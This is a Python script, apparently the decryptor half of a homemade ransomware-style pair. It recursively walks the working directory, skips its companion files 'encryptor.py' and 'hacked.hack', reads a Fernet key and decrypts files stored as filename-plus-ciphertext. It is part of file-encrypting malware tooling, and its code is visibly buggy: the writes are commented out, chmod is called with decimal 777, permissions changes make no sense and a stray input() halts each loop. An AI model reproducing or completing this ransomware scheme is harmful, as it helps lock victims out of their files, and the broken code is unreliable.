import os
import os.path
import platform
import stat
from cryptography.fernet import Fernet
from tkinter import *
from tkinter.ttk import *

files = []
indfiles = []

#operating_system = platform.system()
operating_system = "Windows"
print(operating_system)

if operating_system == "Windows":
	print("CWD = C:\\Users\\")
	operator = "\\"
	#cwd = "C:\\Users\\"
if operating_system == "Linux":
	print("CWD = /home")
	#cwd = "/home"
	operator = "/"
	
if operating_system == "Darwin":
	print("CWD = /Users/")
	#cwd = "/Users/"
	operator = "/"

cwd = os.getcwd()
os.chmod(cwd, stat.S_IRWXO)
os.chmod(cwd, stat.S_IRWXG)
 	
def decrypt(cwd):
	os.chmod(cwd, 777)
	os.chmod(files[0], stat.S_IRWXG)
	with open("hacked.hack", "rb") as key:
		secretkey = key.read()
	print(files[0])
	os.chmod(files[0], stat.S_IRWXG)
	with open(files[0], "r") as thefile:
		filecontents = thefile.readlines(0)
		longfilename = filecontents[0]
		metadata = filecontents[1]
		
		filenamesize = len(longfilename)
		shortenedfilename = longfilename[:filenamesize - 1]
		
		print(shortenedfilename)
	os.chmod(files[0], stat. S_IWRITE)
	
	convertedmeta = bytes(metadata, 'UTF-8')
	metasize = len(convertedmeta)
	metashorted1 = convertedmeta[:metasize -1]

	print(convertedmeta)
	print(metashorted1)
	contents_decrypted = Fernet(secretkey).decrypt(metashorted1)

	#with open (shortenedfilename, 'wb') as newfile:
		#newfile.write(contents_decrypted)

	#os.remove(files[0])
	#print(newstring)
	#print(contents)
	a = input()

	files.pop(0)
 	
def folder(newwd):
	cwd = newwd	
	os.chmod(cwd, stat.S_IRWXG)
	for file in os.listdir(newwd):
		os.chmod(file, stat.S_IRWXG)
		if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
			continue
		
		os.chmod(file, stat.S_IRWXG)
		if os.path.isfile(cwd+file):
			files.append(cwd+file)
			indfiles.append(file)
			decrypt(cwd)

		os.chmod(file, stat.S_IRWXG)
		if os.path.isdir(cwd+file):
			newwd = ((cwd)+file+operator)
			folder(newwd)
			
cwd = os.getcwd()+operator
for file in os.listdir(cwd):
	if file == "encryptor.py" or file == "hacked.hack" or file == "decryptor.py" or "crypt" in file:
		continue
	if os.path.isfile(file):
		files.append(cwd+file)
		decrypt(cwd)
			
	if os.path.isdir(file):
		newwd = (os.getcwd()+"/"+file+"/")
		folder(newwd)
